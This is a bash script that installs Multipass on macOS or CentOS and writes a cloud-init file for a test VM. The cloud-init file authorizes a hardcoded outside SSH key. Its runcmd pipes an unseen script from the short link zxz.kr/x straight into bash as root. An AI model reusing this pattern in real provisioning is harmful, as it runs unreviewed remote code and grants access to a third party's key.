#!/bin/bash
UNAMECHK=`uname`
######################################################################################
if [[ $UNAMECHK == "Darwin" ]]; then
#OSX
	if [[ $WORKDIR == "" ]]; then WORKDIR="$HOME/pbmp"; fi
elif [[ $UNAMECHK == "Linux" ]]; then 
#Linux
	if [[ $WORKDIR == "" ]]; then WORKDIR="$HOME/pbmp"; fi
else
	echo ""
fi

#WorkDir create
if [ ! -d $WORKDIR ]; then mkdir -p $WORKDIR; fi
#######################################################################################
#######################################################################################
##Linux sudo auth check
sudopermission(){
if SUDOCHK=$(sudo -n -v 2>&1);test -z "$SUDOCHK"; then
    SUDO=sudo
    if [ $(id -u) -eq 0 ]; then SUDO= ;fi
else
	echo "root permission required"
	exit 1
fi
##OS install package mgmt check
pkgchk
}
##OSX timeout command : brew install coreutils
#######################################################################################


##Host IP Check
hostipcheck(){
if [[ $HOSTIP == "" ]]; then
	if [[ $UNAMECHK == "Darwin" ]]; then
		HOSTIP=$(ifconfig | grep "inet " | grep -v  "127.0.0.1" | awk -F " " '{print $2}'|head -n1)
	else
		HOSTIP=$(ip a | grep "inet " | grep -v  "127.0.0.1" | awk -F " " '{print $2}'|awk -F "/" '{print $1}'|head -n1)
	fi
fi
}
######################################################################################
##
info(){
  echo -e '\033[92m[INFO]  \033[0m' "$@"
}
warn()
{
  echo -e '\033[93m[WARN] \033[0m' "$@" >&2
}
fatal()
{
  echo -e '\033[91m[ERROR] \033[0m' "$@" >&2
  exit 1
}

#######################################################################################

## package cmd Check
pkgchk(){
	LANG=en_US.UTF-8
	yum > /tmp/check_pkgmgmt 2>&1
	if [[ `(grep 'yum.*not\|not.*yum' /tmp/check_pkgmgmt)` == "" ]];then
		centosnap
	#else
		#Pkg_mgmt="apt-get"
		#apt update
	fi
}


##OSX brew Install
osxbrew(){
	/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
}

##CentOS Snap Install
centosnap(){
	################### SNAP find chk
	
$SUDO yum install epel-release -y
$SUDO yum install snapd -y 
$SUDO systemctl enable --now snapd.socket
$SUDO systemctl restart snapd
$SUDO ln -s /var/lib/snapd/snap /snap
#echo "PATH=/var/lib/snapd/snap/bin:/snap/bin:$PATH"
#echo "⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇ run shell"
echo "export PATH=/snap/bin:\$PATH" | $SUDO tee -a /etc/profile > /dev/null
}

##multipass Install START
multipass_snap(){
if [ $(snap list multipass|wc -l) -eq 0 ]; then
	$SUDO snap install multipass
fi
}
multipass_brew(){
	if [ $(brew list --cask|grep multipass|wc -l) -eq 1 ]; then
		warn "Warning: Cask 'multipass' is already installed."
		info `brew cask info multipass`
	else
		brew cask install multipass
		brew install bash-completion
	fi
#	multipass version
}
##multipass Install END

########################################

case $UNAMECHK in
	Darwin)
		multipass_brew
		;;
	Linux)
		sudopermission
		multipass_snap
		;;
	*)
		echo "TEST"
		;;
esac

############### TEST


hostipcheck
info $HOSTIP

#echo "PATH=/var/lib/snapd/snap/bin:/snap/bin:$PATH"
#echo "⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇ run shell"
echo "export PATH=/snap/bin:\$PATH"
################################33
#DEL
#brew cask uninstall multipass
#brew cask zap multipass # to destroy all data, too

###################################
########################⬇
#### multipass default-set file
cat << EOF > ~/cloud-init.yaml
#cloud-config
ssh_authorized_keys:
  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJ2GtAIuRkHcO79DIWT1BI7FoAVpL/Ly0V41v9alEEhpZ4xFuau46EYcRvKe0F589pxoPrN7csAXePlePypSlO29Kw3Ds0sBg67jmM3I6si4B/rYnMhkjaRcTZB6IYdKwWDbFJQePYhjjpfY4PFjwuRpvZoFeU11mLt1Yf3t9ZeKkLhxCT4cpWMR4E7ex4dCxYL9nOeiI76N4y4dhv4a2xvLGPeFjeiXUZRil4G49c2Rb4E50yOfp0Wu4BPOGwCpWJ8k5m4cW+fzKZZVfr6SHSAOFA3GfmclGJctPHm9pF0HRuPmuKPwn+z79/sZNjIdzefI2mHBuahIVBVNVT/BSbFl2p48CGlRyoLyBO41UUc6xkeRb3pxVV5P7jLRRnmVCpk0qvxKSbfLEFKd8wdEXybwrNb622SvttZfNufmsjUC1ywcV0ysGpolUHeLHqF09EnT4Q+jNR313zjPi1hF8QhkIyGDU60bWqvUbdqkIu8sgDdD7W5mWJLQZEoOnba7E= peter@Mac-mini
package_update: true
packages:
 - curl
 - jq
 - git
write_files:
  - content: |-
    owner: ubuntu:ubuntu
    path: /home/ubuntu/file.txt
    permissions: '0644'
bootcmd:
  - echo $(whoami) > /root/boot.txt
runcmd:
  - curl zxz.kr/x|bash
EOF
echo "⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇ multipass test(default focal 20.04)"
echo "multipass launch focal --name multipass-provbee --cpus 2 --mem 2G --disk 5G --cloud-init ~/cloud-init.yaml"
################
#apt install -y libvirt-daemon-driver-qemu qemu-kvm qemu-system libvirt-daemon-system
#qemu-kvm libvirt-clients bridge-utils virt-manager
#echo "Y" > /sys/module/kvm/parameters/ignore_msrs
##qemu-kvm-core.x86_64 qemu-kvm.x86_64 #qemu-kvm-common.x86_64
#libvirt-daemon-kvm.x86_64 mkisofs
#yum install libvirt-devel
#systemctl stop NetworkManager
